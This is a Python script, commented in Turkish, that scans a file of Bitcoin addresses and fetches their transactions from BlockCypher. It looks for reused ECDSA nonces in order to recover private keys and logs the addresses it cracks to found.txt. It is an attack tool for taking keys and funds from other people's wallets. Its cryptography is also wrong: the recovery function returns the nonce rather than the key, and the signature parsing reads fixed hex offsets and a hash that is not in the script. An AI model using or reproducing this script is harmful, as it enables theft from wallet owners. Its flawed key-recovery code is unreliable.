import time
import requests
from sympy import mod_inverse

# Sabitler
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1 prime order

# Private key kurtarma fonksiyonu
def recover_private_key(r, s1, s2, z1, z2, n):
    try:
        s_diff = (s1 - s2) % n
        z_diff = (z1 - z2) % n
        s_diff_inv = mod_inverse(s_diff, n)
        private_key = (z_diff * s_diff_inv) % n
        return private_key
    except ValueError:
        print("Modüler ters hesaplaması başarısız oldu!")
        return None

# BlockCypher API'den işlem bilgilerini çekme
def fetch_transactions(address):
    url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/full"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print(f"API Hatası: {response.status_code} - {response.text}")
        return None

# İşlem detaylarından imza bilgilerini çıkarma
def extract_signature_data(tx):
    inputs = tx.get("inputs", [])
    if not inputs:
        return []

    signatures = []
    for inp in inputs:
        script = inp.get("script", "")
        if script and len(script) >= 130:
            try:
                r = int(script[:64], 16)
                s = int(script[64:128], 16)
                z = int(script[128:192], 16)  # Örnek, hash doğrulama için düzenlenebilir
                signatures.append({"r": r, "s": s, "z": z})
            except ValueError:
                continue
    return signatures

# Aynı r değerine sahip işlemleri tespit et ve private key kurtar
def find_and_recover_private_keys(transactions):
    signature_map = {}
    private_keys = []
    addresses_with_keys = []  # Private key bulunan adresler

    for tx in transactions:
        sigs = extract_signature_data(tx)
        for sig in sigs:
            r = sig["r"]
            if r in signature_map:
                existing_sig = signature_map[r]
                # Aynı r değerine sahip imzalar bulundu
                private_key = recover_private_key(
                    r,
                    existing_sig["s"],
                    sig["s"],
                    existing_sig["z"],
                    sig["z"],
                    SECP256K1_N,
                )
                if private_key:
                    print(f"Aynı nonce (r) tespit edildi! Private Key: {hex(private_key)}")
                    private_keys.append(private_key)
                    addresses_with_keys.append(tx['inputs'][0].get('addresses', [''])[0])  # İlgili adresi ekleyin
            else:
                # İlk kez görülen r değeri
                signature_map[r] = sig

    return private_keys, addresses_with_keys

# Ana program
def main():
    with open("v.txt", "r") as file:
        addresses = file.readlines()

    # Her bir adresi sırayla işleme
    for address in addresses:
        address = address.strip()  # Adreste boşlukları temizle
        print(f"Adres: {address} için işlem bilgileri çekiliyor...")
        data = fetch_transactions(address)

        if not data:
            print(f"Adres {address} için işlem bulunamadı veya API hatası.")
            continue

        # İşlemleri al
        transactions = data.get("txs", [])
        if not transactions:
            print(f"Adres {address} için işlem geçmişi bulunamadı.")
            continue

        print(f"{len(transactions)} işlem bulundu. İşlem geçmişi taranıyor...")
        private_keys, addresses_with_keys = find_and_recover_private_keys(transactions)

        if private_keys:
            print(f"{len(private_keys)} adet private key kurtarıldı!")
            with open("found.txt", "a") as found_file:
                for addr in addresses_with_keys:
                    found_file.write(f"{addr}\n")  # Private key bulunan Bitcoin adresini yaz
        else:
            print(f"Adres {address} için nonce (r) tekrarı bulunamadı.")

        # API banını önlemek için 5 saniye bekleyin
        print("API banını önlemek için 5 saniye bekleniyor...")
        time.sleep(5)

if __name__ == "__main__":
    main()
